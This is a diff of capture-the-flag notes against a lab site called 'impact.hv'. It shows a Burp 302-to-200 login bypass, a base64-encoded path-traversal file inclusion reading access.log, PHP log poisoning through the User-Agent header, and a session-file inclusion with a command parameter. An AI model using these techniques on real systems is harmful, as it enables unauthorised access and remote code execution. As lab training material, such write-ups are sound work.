@@ -5,6 +5,8 @@
 A hacker group organises cyber attacks against companies and offers the sensitive data they obtain for sale with cryptocurrency on the website called "Impact". This hacker group is increasing the list of target companies every day. Your task is to register as an ordinary customer on this website and collect information about the hacker group and its manager. Good luck in your mission!
 
 * info gathering
+
+
 #+begin_src sh
 🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_impact_hv-1760458064.state ...
 [#>------------------] - 2m     19591/270037  75m     found:21      errors:4932
@@ -16,6 +18,11 @@ A hacker group organises cyber attacks against companies and offers the sensitiv
 [>-------------------] - 2m      1461/30000   11/s    http://impact.hv/webadmin/
 #+end_src
 
+*admin email* ->
+: zerotrace@secretmail.hv
+
+access the application, create a user and log into the account, after logging in, send the payment request to the "hacker" (the admin)
+
 Is possible to bypass the login page with the /webadmin/ page, when we access /webadmin/ we are redirect to the /webadmin/login
 
 With Burp, if we modify the response status code from 302 to 200, we bypass the login page. But this is possible with proxy intercet, where we can modify the response before reach the browser.
@@ -24,15 +31,57 @@ To modify and continue with the modified response, we need to create a match and
 
 Create an rule where all 302 Response headers go to 200
 
+After login adminpanel, accept the request from your normal user created early.
+*LFI to read access.log* ->
+#+begin_src sh
+GET /search.php?name=Li4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vdmFyL2xvZy9hcGFjaGUyL2FjY2Vzcy5sb2c%3d HTTP/1.1
+Host: impact.hv
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://impact.hv/profile.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=seccun2ljsqg1ot2el57pvngf0
+Connection: keep-alive
+#+end_src
+
+*test injection with User-Agent header* ->
+#+begin_src sh
+[19:36][]~ ✮ curl -v 'http://impact.hv/' -A "<?php echo 'Hello World'; ?>"
+ Host impact.hv:80 was resolved.
+ IPv6: (none)
+ IPv4: 172.20.24.170
+   Trying 172.20.24.170:80...
+ Established connection to impact.hv (172.20.24.170 port 80) from 10.8.58.60 port
+ 33472
+ using HTTP/1.x
+> GET / HTTP/1.1
+> Host: impact.hv
+> User-Agent: <?php echo 'Hello World'; ?>
+> Accept: /
+>
+ Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Tue, 14 Oct 2025 22:40:10 GMT
+< Server: Apache/2.4.59 (Debian)
+< Set-Cookie: PHPSESSID=vmq5uvrhdsldur0bh8lukk9kl9; path=/
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< Vary: Accept-Encoding
+< Content-Length: 5235
+< Content-Type: text/html; charset=UTF-8
+<
+<!DOCTYPE html>
+<html lang="en">
+<head>
+#+end_src
+
+Checking the access.log file again, you can see that the injection was successful ->
+#+begin_src javascript
+10.8.58.60 - - [14/Oct/2025:18:37:57 -0400] "GET /search.php?name=Li4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vLi4uLi8vdmFyL2xvZy9hcGFjaGUyL2FjY2Vzcy5sb2c%3d HTTP/1.1" 200 1098 "http://impact.hv/profile.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
+10.8.58.60 - - [14/Oct/2025:18:40:10 -0400] "GET / HTTP/1.1" 200 5576 "-" "Hello World"
+#+end_src
 
 
-
-
-
-*admin email* ->
-: zerotrace@secretmail.hv
-
-
-
-*User agent injection ->*
-: [11:10][]~ ✮ curl -v "http://impact.hv/search.php?name=../../../../../../../var/lib/php/sessions/sess_95j17bn4agoa0kql3k7mtl1o0f&cmd=sleep%2010"
